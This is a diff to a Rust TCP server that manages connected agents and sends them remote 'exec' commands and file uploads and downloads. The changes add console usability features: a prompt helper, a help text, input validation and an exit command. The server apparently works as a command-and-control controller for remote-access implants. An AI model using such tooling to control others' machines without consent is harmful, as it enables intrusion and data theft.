@@ -3,7 +3,7 @@ use std::fs::File;
 use std::io::{BufRead, BufReader, Read, Write};
 use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4, TcpListener, TcpStream};
 use std::sync::{Arc, Mutex};
-use std::thread;
+use std::thread::{self};
 
 /* Client info struct. */
 struct ClientInfo {
@@ -13,6 +13,12 @@ struct ClientInfo {
     stream: Arc<Mutex<TcpStream>>,
 }
 
+fn get_prompt() {
+
+    print!("> ");
+    std::io::stdout().flush().unwrap();
+
+}
 /* Remove the client from the list. */
 fn remove_client(clients: &Arc<Mutex<Vec<ClientInfo>>>, client_id: usize) {
 
@@ -27,6 +33,24 @@ fn remove_client(clients: &Arc<Mutex<Vec<ClientInfo>>>, client_id: usize) {
 
 }
 
+
+/* Function to check the input return a reference to a bool. */
+fn check_input(parts: Vec<&str>, length_check: usize) -> bool {
+
+    parts.len() < length_check
+
+}
+
+/* Function to print the help message. */
+fn help() {
+    
+    // Print help message.
+    println!("Type 'clients' to list clients.");
+    println!("Type '<client id> upload <remote path> <localpath>' to upload a file.");
+    println!("Type '<client id> exec <command>' to send a command.");
+    println!("Type '<client id> download <remote path> <localpath>' to download a file.");
+
+}
 /* Function to send the commands to the clients. */
 fn send_command_to_client(clients: &Arc<Mutex<Vec<ClientInfo>>>, client_id: usize, command: &str,) -> Result<(), String> {
 
@@ -128,8 +152,7 @@ fn main() {
         loop {
     
             // Print prompt
-            print!("> ");
-            std::io::stdout().flush().unwrap();
+            get_prompt();
 
             let mut input_line = String::new();
             if stdin.read_line(&mut input_line).is_err() {
@@ -157,22 +180,42 @@ fn main() {
 
             };
 
+            // Check that the current_line is not empty.
+            if current_line.is_empty() {
+
+                continue;
+            
+            }
+
             // Split the user input into the ID of the client and the command to send.
             let mut parts = current_line.splitn(2, ' ');
 
             // ID of the client.
             let id_str = parts.next().unwrap_or("");
 
-            // Check if the user wants to upload a file.
-            let search_string = "upload ";
-
             // Check if the search string is in the current line.
-            if current_line.contains(search_string) {
+            if current_line.contains("upload") {
 
-                // Split the line into the command and the paths.
+                // Split the current line into the command and the file to upload.
                 let parts: Vec<&str> = current_line.split_whitespace().collect();
+
+                if check_input(parts.clone(), 4) {
+
+                    // Print error message.
+                    println!("Invalid command. Usage: <client id> upload <remote path> <localpath>");
+                    continue;
+                }
+
                 let rfile = parts[2];
                 let lpath = parts[3];
+
+                // Check if the file exists.
+                if !std::path::Path::new(lpath).exists() {
+
+                    // Print error message.
+                    println!("File does not exist: {}" , lpath);
+                    continue;
+                }
 
                 // Read the file.
                 let mut file = File::open(lpath).unwrap();
@@ -208,7 +251,12 @@ fn main() {
                     }
                 
                 }
+             
+             } else if current_line == "help" {
             
+                // Call the help function.
+                help();
+                        
             } else if current_line == "clients" {
             
                 // Print the list of connected clients.
@@ -217,6 +265,7 @@ fn main() {
                 if lock.is_empty() {
             
                     println!("No clients connected.");
+                    get_prompt();
             
                 } else {
             
@@ -231,8 +280,28 @@ fn main() {
             
                 }
             
+            // Else the program.
+            } else if current_line == "exit" {
+
+                // Exit the program.
+                println!("Exiting...");
+                std::process::exit(0);
+
             } else {
             
+                if current_line.contains("download") {
+
+                    // Split the current line into the command and the file to download.
+                    let parts: Vec<&str> = current_line.split_whitespace().collect();
+   
+                    if check_input(parts.clone(), 4) {
+   
+                        // Print error message.
+                        println!("Invalid command. Usage: <client id> download <remote path> <localpath>");
+                        continue;
+                    }
+                }
+
                 // Command to send.
                 let cmd = parts.next().unwrap_or("");
 
@@ -247,6 +316,7 @@ fn main() {
                 } else {
             
                     println!("Unknown command. Type 'clients' to list clients.");
+                    get_prompt();
             
                 }
            
@@ -272,7 +342,7 @@ fn main() {
 
                 // Message for the server to see that a client has connected.
                 println!("[+] Client connected: {:?}", client_address);
-
+      
                 // Clone the client's stream for reading and writing.
                 let write_stream = client_stream.try_clone().expect("Failed to clone stream");
 
@@ -335,6 +405,8 @@ fn main() {
                     }
 
                     println!("Client {} named: {}", client_id, agent_name);
+                    get_prompt();
+
 
                     // Now read messages in a loop.
                     loop {
@@ -387,10 +459,19 @@ fn main() {
                         }
                     
                         // If the user types: 0 download remoteFile localFile, then "download" is the "operation."
+
                         let todo = tokens[1];
 
-                        // Remote file path.
-                        //let rfile = if tokens.len() > 2 { tokens[2] } else { "" };
+                        // If todo is empty, then the default is the command clients.
+                        let todo = if todo.is_empty() { 
+                            
+                            "clients" 
+                        
+                        } else { 
+                            
+                            todo 
+                        
+                        };
 
                         // Local file path.
                         let lpath = if tokens.len() > 3 { tokens[3] } else { "" };
@@ -414,12 +495,16 @@ fn main() {
 
                                 }
 
+                               get_prompt();
+
                             }
 
                             "exec" => {
 
                                 // Print the results returned from the client.
                                 println!("Received from client {}: \"{}\"", client_id, message);
+                                
+                                get_prompt();
 
                             }
 
@@ -432,6 +517,8 @@ fn main() {
                                     client_id, message
 
                                 );
+          
+                                get_prompt();
 
                             }
 
